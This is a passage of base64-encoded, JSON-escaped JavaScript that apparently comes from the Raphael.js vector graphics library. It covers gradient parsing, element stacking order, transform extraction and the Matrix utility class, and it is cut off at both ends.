CAgICAgICAgICAgICAgICBwYXIgPSBncmFkaWVudFtpXS5tYXRjaCgvXihbXjpdKik6PyhbXFxkXFwuXSopLyk7XG4gICAgICAgICAgICAgICAgZG90LmNvbG9yID0gUi5nZXRSR0IocGFyWzFdKTtcbiAgICAgICAgICAgICAgICBpZiAoZG90LmNvbG9yLmVycm9yKSB7XG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBudWxsO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBkb3Qub3BhY2l0eSA9IGRvdC5jb2xvci5vcGFjaXR5O1xuICAgICAgICAgICAgICAgIGRvdC5jb2xvciA9IGRvdC5jb2xvci5oZXg7XG4gICAgICAgICAgICAgICAgcGFyWzJdICYmIChkb3Qub2Zmc2V0ID0gcGFyWzJdICsgXCIlXCIpO1xuICAgICAgICAgICAgICAgIGRvdHMucHVzaChkb3QpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgZm9yIChpID0gMSwgaWkgPSBkb3RzLmxlbmd0aCAtIDE7IGkgPCBpaTsgaSsrKSB7XG4gICAgICAgICAgICAgICAgaWYgKCFkb3RzW2ldLm9mZnNldCkge1xuICAgICAgICAgICAgICAgICAgICB2YXIgc3RhcnQgPSB0b0Zsb2F0KGRvdHNbaSAtIDFdLm9mZnNldCB8fCAwKSxcbiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCA9IDA7XG4gICAgICAgICAgICAgICAgICAgIGZvciAodmFyIGogPSBpICsgMTsgaiA8IGlpOyBqKyspIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkb3RzW2pdLm9mZnNldCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCA9IGRvdHNbal0ub2Zmc2V0O1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGlmICghZW5kKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBlbmQgPSAxMDA7XG4gICAgICAgICAgICAgICAgICAgICAgICBqID0gaWk7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgZW5kID0gdG9GbG9hdChlbmQpO1xuICAgICAgICAgICAgICAgICAgICB2YXIgZCA9IChlbmQgLSBzdGFydCkgLyAoaiAtIGkgKyAxKTtcbiAgICAgICAgICAgICAgICAgICAgZm9yICg7IGkgPCBqOyBpKyspIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0ICs9IGQ7XG4gICAgICAgICAgICAgICAgICAgICAgICBkb3RzW2ldLm9mZnNldCA9IHN0YXJ0ICsgXCIlXCI7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICByZXR1cm4gZG90cztcbiAgICAgICAgfSksXG4gICAgICAgIHRlYXIgPSBSLl90ZWFyID0gZnVuY3Rpb24gKGVsLCBwYXBlcikge1xuICAgICAgICAgICAgZWwgPT0gcGFwZXIudG9wICYmIChwYXBlci50b3AgPSBlbC5wcmV2KTtcbiAgICAgICAgICAgIGVsID09IHBhcGVyLmJvdHRvbSAmJiAocGFwZXIuYm90dG9tID0gZWwubmV4dCk7XG4gICAgICAgICAgICBlbC5uZXh0ICYmIChlbC5uZXh0LnByZXYgPSBlbC5wcmV2KTtcbiAgICAgICAgICAgIGVsLnByZXYgJiYgKGVsLnByZXYubmV4dCA9IGVsLm5leHQpO1xuICAgICAgICB9LFxuICAgICAgICB0b2Zyb250ID0gUi5fdG9mcm9udCA9IGZ1bmN0aW9uIChlbCwgcGFwZXIpIHtcbiAgICAgICAgICAgIGlmIChwYXBlci50b3AgPT09IGVsKSB7XG4gICAgICAgICAgICAgICAgcmV0dXJuO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgdGVhcihlbCwgcGFwZXIpO1xuICAgICAgICAgICAgZWwubmV4dCA9IG51bGw7XG4gICAgICAgICAgICBlbC5wcmV2ID0gcGFwZXIudG9wO1xuICAgICAgICAgICAgcGFwZXIudG9wLm5leHQgPSBlbDtcbiAgICAgICAgICAgIHBhcGVyLnRvcCA9IGVsO1xuICAgICAgICB9LFxuICAgICAgICB0b2JhY2sgPSBSLl90b2JhY2sgPSBmdW5jdGlvbiAoZWwsIHBhcGVyKSB7XG4gICAgICAgICAgICBpZiAocGFwZXIuYm90dG9tID09PSBlbCkge1xuICAgICAgICAgICAgICAgIHJldHVybjtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIHRlYXIoZWwsIHBhcGVyKTtcbiAgICAgICAgICAgIGVsLm5leHQgPSBwYXBlci5ib3R0b207XG4gICAgICAgICAgICBlbC5wcmV2ID0gbnVsbDtcbiAgICAgICAgICAgIHBhcGVyLmJvdHRvbS5wcmV2ID0gZWw7XG4gICAgICAgICAgICBwYXBlci5ib3R0b20gPSBlbDtcbiAgICAgICAgfSxcbiAgICAgICAgaW5zZXJ0YWZ0ZXIgPSBSLl9pbnNlcnRhZnRlciA9IGZ1bmN0aW9uIChlbCwgZWwyLCBwYXBlcikge1xuICAgICAgICAgICAgdGVhcihlbCwgcGFwZXIpO1xuICAgICAgICAgICAgZWwyID09IHBhcGVyLnRvcCAmJiAocGFwZXIudG9wID0gZWwpO1xuICAgICAgICAgICAgZWwyLm5leHQgJiYgKGVsMi5uZXh0LnByZXYgPSBlbCk7XG4gICAgICAgICAgICBlbC5uZXh0ID0gZWwyLm5leHQ7XG4gICAgICAgICAgICBlbC5wcmV2ID0gZWwyO1xuICAgICAgICAgICAgZWwyLm5leHQgPSBlbDtcbiAgICAgICAgfSxcbiAgICAgICAgaW5zZXJ0YmVmb3JlID0gUi5faW5zZXJ0YmVmb3JlID0gZnVuY3Rpb24gKGVsLCBlbDIsIHBhcGVyKSB7XG4gICAgICAgICAgICB0ZWFyKGVsLCBwYXBlcik7XG4gICAgICAgICAgICBlbDIgPT0gcGFwZXIuYm90dG9tICYmIChwYXBlci5ib3R0b20gPSBlbCk7XG4gICAgICAgICAgICBlbDIucHJldiAmJiAoZWwyLnByZXYubmV4dCA9IGVsKTtcbiAgICAgICAgICAgIGVsLnByZXYgPSBlbDIucHJldjtcbiAgICAgICAgICAgIGVsMi5wcmV2ID0gZWw7XG4gICAgICAgICAgICBlbC5uZXh0ID0gZWwyO1xuICAgICAgICB9LFxuICAgICAgICAvKlxcXG4gICAgICAgICAqIFJhcGhhZWwudG9NYXRyaXhcbiAgICAgICAgIFsgbWV0aG9kIF1cbiAgICAgICAgICoqXG4gICAgICAgICAqIFV0aWxpdHkgbWV0aG9kXG4gICAgICAgICAqKlxuICAgICAgICAgKiBSZXR1cm5zIG1hdHJpeCBvZiB0cmFuc2Zvcm1hdGlvbnMgYXBwbGllZCB0byBhIGdpdmVuIHBhdGhcbiAgICAgICAgID4gUGFyYW1ldGVyc1xuICAgICAgICAgLSBwYXRoIChzdHJpbmcpIHBhdGggc3RyaW5nXG4gICAgICAgICAtIHRyYW5zZm9ybSAoc3RyaW5nfGFycmF5KSB0cmFuc2Zvcm1hdGlvbiBzdHJpbmdcbiAgICAgICAgID0gKG9iamVjdCkgQE1hdHJpeFxuICAgICAgICBcXCovXG4gICAgICAgIHRvTWF0cml4ID0gUi50b01hdHJpeCA9IGZ1bmN0aW9uIChwYXRoLCB0cmFuc2Zvcm0pIHtcbiAgICAgICAgICAgIHZhciBiYiA9IHBhdGhEaW1lbnNpb25zKHBhdGgpLFxuICAgICAgICAgICAgICAgIGVsID0ge1xuICAgICAgICAgICAgICAgICAgICBfOiB7XG4gICAgICAgICAgICAgICAgICAgICAgICB0cmFuc2Zvcm06IEVcbiAgICAgICAgICAgICAgICAgICAgfSxcbiAgICAgICAgICAgICAgICAgICAgZ2V0QkJveDogZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGJiO1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfTtcbiAgICAgICAgICAgIGV4dHJhY3RUcmFuc2Zvcm0oZWwsIHRyYW5zZm9ybSk7XG4gICAgICAgICAgICByZXR1cm4gZWwubWF0cml4O1xuICAgICAgICB9LFxuICAgICAgICAvKlxcXG4gICAgICAgICAqIFJhcGhhZWwudHJhbnNmb3JtUGF0aFxuICAgICAgICAgWyBtZXRob2QgXVxuICAgICAgICAgKipcbiAgICAgICAgICogVXRpbGl0eSBtZXRob2RcbiAgICAgICAgICoqXG4gICAgICAgICAqIFJldHVybnMgcGF0aCB0cmFuc2Zvcm1lZCBieSBhIGdpdmVuIHRyYW5zZm9ybWF0aW9uXG4gICAgICAgICA+IFBhcmFtZXRlcnNcbiAgICAgICAgIC0gcGF0aCAoc3RyaW5nKSBwYXRoIHN0cmluZ1xuICAgICAgICAgLSB0cmFuc2Zvcm0gKHN0cmluZ3xhcnJheSkgdHJhbnNmb3JtYXRpb24gc3RyaW5nXG4gICAgICAgICA9IChzdHJpbmcpIHBhdGhcbiAgICAgICAgXFwqL1xuICAgICAgICB0cmFuc2Zvcm1QYXRoID0gUi50cmFuc2Zvcm1QYXRoID0gZnVuY3Rpb24gKHBhdGgsIHRyYW5zZm9ybSkge1xuICAgICAgICAgICAgcmV0dXJuIG1hcFBhdGgocGF0aCwgdG9NYXRyaXgocGF0aCwgdHJhbnNmb3JtKSk7XG4gICAgICAgIH0sXG4gICAgICAgIGV4dHJhY3RUcmFuc2Zvcm0gPSBSLl9leHRyYWN0VHJhbnNmb3JtID0gZnVuY3Rpb24gKGVsLCB0c3RyKSB7XG4gICAgICAgICAgICBpZiAodHN0ciA9PSBudWxsKSB7XG4gICAgICAgICAgICAgICAgcmV0dXJuIGVsLl8udHJhbnNmb3JtO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgdHN0ciA9IFN0cih0c3RyKS5yZXBsYWNlKC9cXC57M318XFx1MjAyNi9nLCBlbC5fLnRyYW5zZm9ybSB8fCBFKTtcbiAgICAgICAgICAgIHZhciB0ZGF0YSA9IFIucGFyc2VUcmFuc2Zvcm1TdHJpbmcodHN0ciksXG4gICAgICAgICAgICAgICAgZGVnID0gMCxcbiAgICAgICAgICAgICAgICBkeCA9IDAsXG4gICAgICAgICAgICAgICAgZHkgPSAwLFxuICAgICAgICAgICAgICAgIHN4ID0gMSxcbiAgICAgICAgICAgICAgICBzeSA9IDEsXG4gICAgICAgICAgICAgICAgXyA9IGVsLl8sXG4gICAgICAgICAgICAgICAgbSA9IG5ldyBNYXRyaXg7XG4gICAgICAgICAgICBfLnRyYW5zZm9ybSA9IHRkYXRhIHx8IFtdO1xuICAgICAgICAgICAgaWYgKHRkYXRhKSB7XG4gICAgICAgICAgICAgICAgZm9yICh2YXIgaSA9IDAsIGlpID0gdGRhdGEubGVuZ3RoOyBpIDwgaWk7IGkrKykge1xuICAgICAgICAgICAgICAgICAgICB2YXIgdCA9IHRkYXRhW2ldLFxuICAgICAgICAgICAgICAgICAgICAgICAgdGxlbiA9IHQubGVuZ3RoLFxuICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9IFN0cih0WzBdKS50b0xvd2VyQ2FzZSgpLFxuICAgICAgICAgICAgICAgICAgICAgICAgYWJzb2x1dGUgPSB0WzBdICE9IGNvbW1hbmQsXG4gICAgICAgICAgICAgICAgICAgICAgICBpbnZlciA9IGFic29sdXRlID8gbS5pbnZlcnQoKSA6IDAsXG4gICAgICAgICAgICAgICAgICAgICAgICB4MSxcbiAgICAgICAgICAgICAgICAgICAgICAgIHkxLFxuICAgICAgICAgICAgICAgICAgICAgICAgeDIsXG4gICAgICAgICAgICAgICAgICAgICAgICB5MixcbiAgICAgICAgICAgICAgICAgICAgICAgIGJiO1xuICAgICAgICAgICAgICAgICAgICBpZiAoY29tbWFuZCA9PSBcInRcIiAmJiB0bGVuID09IDMpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhYnNvbHV0ZSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHgxID0gaW52ZXIueCgwLCAwKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB5MSA9IGludmVyLnkoMCwgMCk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgeDIgPSBpbnZlci54KHRbMV0sIHRbMl0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHkyID0gaW52ZXIueSh0WzFdLCB0WzJdKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtLnRyYW5zbGF0ZSh4MiAtIHgxLCB5MiAtIHkxKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbS50cmFuc2xhdGUodFsxXSwgdFsyXSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoY29tbWFuZCA9PSBcInJcIikge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHRsZW4gPT0gMikge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJiID0gYmIgfHwgZWwuZ2V0QkJveCgxKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtLnJvdGF0ZSh0WzFdLCBiYi54ICsgYmIud2lkdGggLyAyLCBiYi55ICsgYmIuaGVpZ2h0IC8gMik7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVnICs9IHRbMV07XG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKHRsZW4gPT0gNCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhYnNvbHV0ZSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB4MiA9IGludmVyLngodFsyXSwgdFszXSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHkyID0gaW52ZXIueSh0WzJdLCB0WzNdKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbS5yb3RhdGUodFsxXSwgeDIsIHkyKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtLnJvdGF0ZSh0WzFdLCB0WzJdLCB0WzNdKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVnICs9IHRbMV07XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoY29tbWFuZCA9PSBcInNcIikge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHRsZW4gPT0gMiB8fCB0bGVuID09IDMpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBiYiA9IGJiIHx8IGVsLmdldEJCb3goMSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbS5zY2FsZSh0WzFdLCB0W3RsZW4gLSAxXSwgYmIueCArIGJiLndpZHRoIC8gMiwgYmIueSArIGJiLmhlaWdodCAvIDIpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN4ICo9IHRbMV07XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc3kgKj0gdFt0bGVuIC0gMV07XG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKHRsZW4gPT0gNSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhYnNvbHV0ZSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB4MiA9IGludmVyLngodFszXSwgdFs0XSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHkyID0gaW52ZXIueSh0WzNdLCB0WzRdKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbS5zY2FsZSh0WzFdLCB0WzJdLCB4MiwgeTIpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG0uc2NhbGUodFsxXSwgdFsyXSwgdFszXSwgdFs0XSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN4ICo9IHRbMV07XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc3kgKj0gdFsyXTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmIChjb21tYW5kID09IFwibVwiICYmIHRsZW4gPT0gNykge1xuICAgICAgICAgICAgICAgICAgICAgICAgbS5hZGQodFsxXSwgdFsyXSwgdFszXSwgdFs0XSwgdFs1XSwgdFs2XSk7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgXy5kaXJ0eVQgPSAxO1xuICAgICAgICAgICAgICAgICAgICBlbC5tYXRyaXggPSBtO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cblxuICAgICAgICAgICAgLypcXFxuICAgICAgICAgICAgICogRWxlbWVudC5tYXRyaXhcbiAgICAgICAgICAgICBbIHByb3BlcnR5IChvYmplY3QpIF1cbiAgICAgICAgICAgICAqKlxuICAgICAgICAgICAgICogS2VlcHMgQE1hdHJpeCBvYmplY3QsIHdoaWNoIHJlcHJlc2VudHMgZWxlbWVudCB0cmFuc2Zvcm1hdGlvblxuICAgICAgICAgICAgXFwqL1xuICAgICAgICAgICAgZWwubWF0cml4ID0gbTtcblxuICAgICAgICAgICAgXy5zeCA9IHN4O1xuICAgICAgICAgICAgXy5zeSA9IHN5O1xuICAgICAgICAgICAgXy5kZWcgPSBkZWc7XG4gICAgICAgICAgICBfLmR4ID0gZHggPSBtLmU7XG4gICAgICAgICAgICBfLmR5ID0gZHkgPSBtLmY7XG5cbiAgICAgICAgICAgIGlmIChzeCA9PSAxICYmIHN5ID09IDEgJiYgIWRlZyAmJiBfLmJib3gpIHtcbiAgICAgICAgICAgICAgICBfLmJib3gueCArPSArZHg7XG4gICAgICAgICAgICAgICAgXy5iYm94LnkgKz0gK2R5O1xuICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICBfLmRpcnR5VCA9IDE7XG4gICAgICAgICAgICB9XG4gICAgICAgIH0sXG4gICAgICAgIGdldEVtcHR5ID0gZnVuY3Rpb24gKGl0ZW0pIHtcbiAgICAgICAgICAgIHZhciBsID0gaXRlbVswXTtcbiAgICAgICAgICAgIHN3aXRjaCAobC50b0xvd2VyQ2FzZSgpKSB7XG4gICAgICAgICAgICAgICAgY2FzZSBcInRcIjogcmV0dXJuIFtsLCAwLCAwXTtcbiAgICAgICAgICAgICAgICBjYXNlIFwibVwiOiByZXR1cm4gW2wsIDEsIDAsIDAsIDEsIDAsIDBdO1xuICAgICAgICAgICAgICAgIGNhc2UgXCJyXCI6IGlmIChpdGVtLmxlbmd0aCA9PSA0KSB7XG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBbbCwgMCwgaXRlbVsyXSwgaXRlbVszXV07XG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFtsLCAwXTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgY2FzZSBcInNcIjogaWYgKGl0ZW0ubGVuZ3RoID09IDUpIHtcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFtsLCAxLCAxLCBpdGVtWzNdLCBpdGVtWzRdXTtcbiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKGl0ZW0ubGVuZ3RoID09IDMpIHtcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFtsLCAxLCAxXTtcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICByZXR1cm4gW2wsIDFdO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cbiAgICAgICAgfSxcbiAgICAgICAgZXF1YWxpc2VUcmFuc2Zvcm0gPSBSLl9lcXVhbGlzZVRyYW5zZm9ybSA9IGZ1bmN0aW9uICh0MSwgdDIpIHtcbiAgICAgICAgICAgIHQyID0gU3RyKHQyKS5yZXBsYWNlKC9cXC57M318XFx1MjAyNi9nLCB0MSk7XG4gICAgICAgICAgICB0MSA9IFIucGFyc2VUcmFuc2Zvcm1TdHJpbmcodDEpIHx8IFtdO1xuICAgICAgICAgICAgdDIgPSBSLnBhcnNlVHJhbnNmb3JtU3RyaW5nKHQyKSB8fCBbXTtcbiAgICAgICAgICAgIHZhciBtYXhsZW5ndGggPSBtbWF4KHQxLmxlbmd0aCwgdDIubGVuZ3RoKSxcbiAgICAgICAgICAgICAgICBmcm9tID0gW10sXG4gICAgICAgICAgICAgICAgdG8gPSBbXSxcbiAgICAgICAgICAgICAgICBpID0gMCwgaiwgamosXG4gICAgICAgICAgICAgICAgdHQxLCB0dDI7XG4gICAgICAgICAgICBmb3IgKDsgaSA8IG1heGxlbmd0aDsgaSsrKSB7XG4gICAgICAgICAgICAgICAgdHQxID0gdDFbaV0gfHwgZ2V0RW1wdHkodDJbaV0pO1xuICAgICAgICAgICAgICAgIHR0MiA9IHQyW2ldIHx8IGdldEVtcHR5KHR0MSk7XG4gICAgICAgICAgICAgICAgaWYgKCh0dDFbMF0gIT0gdHQyWzBdKSB8fFxuICAgICAgICAgICAgICAgICAgICAodHQxWzBdLnRvTG93ZXJDYXNlKCkgPT0gXCJyXCIgJiYgKHR0MVsyXSAhPSB0dDJbMl0gfHwgdHQxWzNdICE9IHR0MlszXSkpIHx8XG4gICAgICAgICAgICAgICAgICAgICh0dDFbMF0udG9Mb3dlckNhc2UoKSA9PSBcInNcIiAmJiAodHQxWzNdICE9IHR0MlszXSB8fCB0dDFbNF0gIT0gdHQyWzRdKSlcbiAgICAgICAgICAgICAgICAgICAgKSB7XG4gICAgICAgICAgICAgICAgICAgIHJldHVybjtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgZnJvbVtpXSA9IFtdO1xuICAgICAgICAgICAgICAgIHRvW2ldID0gW107XG4gICAgICAgICAgICAgICAgZm9yIChqID0gMCwgamogPSBtbWF4KHR0MS5sZW5ndGgsIHR0Mi5sZW5ndGgpOyBqIDwgamo7IGorKykge1xuICAgICAgICAgICAgICAgICAgICBqIGluIHR0MSAmJiAoZnJvbVtpXVtqXSA9IHR0MVtqXSk7XG4gICAgICAgICAgICAgICAgICAgIGogaW4gdHQyICYmICh0b1tpXVtqXSA9IHR0MltqXSk7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfVxuICAgICAgICAgICAgcmV0dXJuIHtcbiAgICAgICAgICAgICAgICBmcm9tOiBmcm9tLFxuICAgICAgICAgICAgICAgIHRvOiB0b1xuICAgICAgICAgICAgfTtcbiAgICAgICAgfTtcbiAgICBSLl9nZXRDb250YWluZXIgPSBmdW5jdGlvbiAoeCwgeSwgdywgaCkge1xuICAgICAgICB2YXIgY29udGFpbmVyO1xuICAgICAgICBjb250YWluZXIgPSBoID09IG51bGwgJiYgIVIuaXMoeCwgXCJvYmplY3RcIikgPyBnLmRvYy5nZXRFbGVtZW50QnlJZCh4KSA6IHg7XG4gICAgICAgIGlmIChjb250YWluZXIgPT0gbnVsbCkge1xuICAgICAgICAgICAgcmV0dXJuO1xuICAgICAgICB9XG4gICAgICAgIGlmIChjb250YWluZXIudGFnTmFtZSkge1xuICAgICAgICAgICAgaWYgKHkgPT0gbnVsbCkge1xuICAgICAgICAgICAgICAgIHJldHVybiB7XG4gICAgICAgICAgICAgICAgICAgIGNvbnRhaW5lcjogY29udGFpbmVyLFxuICAgICAgICAgICAgICAgICAgICB3aWR0aDogY29udGFpbmVyLnN0eWxlLnBpeGVsV2lkdGggfHwgY29udGFpbmVyLm9mZnNldFdpZHRoLFxuICAgICAgICAgICAgICAgICAgICBoZWlnaHQ6IGNvbnRhaW5lci5zdHlsZS5waXhlbEhlaWdodCB8fCBjb250YWluZXIub2Zmc2V0SGVpZ2h0XG4gICAgICAgICAgICAgICAgfTtcbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgcmV0dXJuIHtcbiAgICAgICAgICAgICAgICAgICAgY29udGFpbmVyOiBjb250YWluZXIsXG4gICAgICAgICAgICAgICAgICAgIHdpZHRoOiB5LFxuICAgICAgICAgICAgICAgICAgICBoZWlnaHQ6IHdcbiAgICAgICAgICAgICAgICB9O1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIHJldHVybiB7XG4gICAgICAgICAgICBjb250YWluZXI6IDEsXG4gICAgICAgICAgICB4OiB4LFxuICAgICAgICAgICAgeTogeSxcbiAgICAgICAgICAgIHdpZHRoOiB3LFxuICAgICAgICAgICAgaGVpZ2h0OiBoXG4gICAgICAgIH07XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogUmFwaGFlbC5wYXRoVG9SZWxhdGl2ZVxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogVXRpbGl0eSBtZXRob2RcbiAgICAgKipcbiAgICAgKiBDb252ZXJ0cyBwYXRoIHRvIHJlbGF0aXZlIGZvcm1cbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgIC0gcGF0aFN0cmluZyAoc3RyaW5nfGFycmF5KSBwYXRoIHN0cmluZyBvciBhcnJheSBvZiBzZWdtZW50c1xuICAgICA9IChhcnJheSkgYXJyYXkgb2Ygc2VnbWVudHMuXG4gICAgXFwqL1xuICAgIFIucGF0aFRvUmVsYXRpdmUgPSBwYXRoVG9SZWxhdGl2ZTtcbiAgICBSLl9lbmdpbmUgPSB7fTtcbiAgICAvKlxcXG4gICAgICogUmFwaGFlbC5wYXRoMmN1cnZlXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBVdGlsaXR5IG1ldGhvZFxuICAgICAqKlxuICAgICAqIENvbnZlcnRzIHBhdGggdG8gYSBuZXcgcGF0aCB3aGVyZSBhbGwgc2VnbWVudHMgYXJlIGN1YmljIGJlemllciBjdXJ2ZXMuXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAtIHBhdGhTdHJpbmcgKHN0cmluZ3xhcnJheSkgcGF0aCBzdHJpbmcgb3IgYXJyYXkgb2Ygc2VnbWVudHNcbiAgICAgPSAoYXJyYXkpIGFycmF5IG9mIHNlZ21lbnRzLlxuICAgIFxcKi9cbiAgICBSLnBhdGgyY3VydmUgPSBwYXRoMmN1cnZlO1xuICAgIC8qXFxcbiAgICAgKiBSYXBoYWVsLm1hdHJpeFxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogVXRpbGl0eSBtZXRob2RcbiAgICAgKipcbiAgICAgKiBSZXR1cm5zIG1hdHJpeCBiYXNlZCBvbiBnaXZlbiBwYXJhbWV0ZXJzLlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSBhIChudW1iZXIpXG4gICAgIC0gYiAobnVtYmVyKVxuICAgICAtIGMgKG51bWJlcilcbiAgICAgLSBkIChudW1iZXIpXG4gICAgIC0gZSAobnVtYmVyKVxuICAgICAtIGYgKG51bWJlcilcbiAgICAgPSAob2JqZWN0KSBATWF0cml4XG4gICAgXFwqL1xuICAgIFIubWF0cml4ID0gZnVuY3Rpb24gKGEsIGIsIGMsIGQsIGUsIGYpIHtcbiAgICAgICAgcmV0dXJuIG5ldyBNYXRyaXgoYSwgYiwgYywgZCwgZSwgZik7XG4gICAgfTtcbiAgICBmdW5jdGlvbiBNYXRyaXgoYSwgYiwgYywgZCwgZSwgZikge1xuICAgICAgICBpZiAoYSAhPSBudWxsKSB7XG4gICAgICAgICAgICB0aGlzLmEgPSArYTtcbiAgICAgICAgICAgIHRoaXMuYiA9ICtiO1xuICAgICAgICAgICAgdGhpcy5jID0gK2M7XG4gICAgICAgICAgICB0aGlzLmQgPSArZDtcbiAgICAgICAgICAgIHRoaXMuZSA9ICtlO1xuICAgICAgICAgICAgdGhpcy5mID0gK2Y7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICB0aGlzLmEgPSAxO1xuICAgICAgICAgICAgdGhpcy5iID0gMDtcbiAgICAgICAgICAgIHRoaXMuYyA9IDA7XG4gICAgICAgICAgICB0aGlzLmQgPSAxO1xuICAgICAgICAgICAgdGhpcy5lID0gMDtcbiAgICAgICAgICAgIHRoaXMuZiA9IDA7XG4gICAgICAgIH1cbiAgICB9XG4gICAgKGZ1bmN0aW9uIChtYXRyaXhwcm90bykge1xuICAgICAgICAvKlxcXG4gICAgICAgICAqIE1hdHJpeC5hZGRcbiAgICAgICAgIFsgbWV0aG9kIF1cbiAgICAgICAgICoqXG4gICAgICAgICAqIEFkZHMgZ2l2ZW4gbWF0cml4IHRvIGV4aXN0aW5nIG9uZS5cbiAgICAgICAgID4gUGFyYW1ldGVyc1xuICAgICAgICAgLSBhIChudW1iZXIpXG4gICAgICAgICAtIGIgKG51bWJlcilcbiAgICAgICAgIC0gYyAobnVtYmVyKVxuICAgICAgICAgLSBkIChudW1iZXIpXG4gICAgICAgICAtIGUgKG51bWJlcilcbiAgICAgICAgIC0gZiAobnVtYmVyKVxuICAgICAgICAgb3JcbiAgICAgICAgIC0gbWF0cml4IChvYmplY3QpIEBNYXRyaXhcbiAgICAgICAgXFwqL1xuICAgICAgICBtYXRyaXhwcm90by5hZGQgPSBmdW5jdGlvbiAoYSwgYiwgYywgZCwgZSwgZikge1xuICAgICAgICAgICAgdmFyIG91dCA9IFtbXSwgW10sIFtdXSxcbiAgICAgICAgICAgICAgICBtID0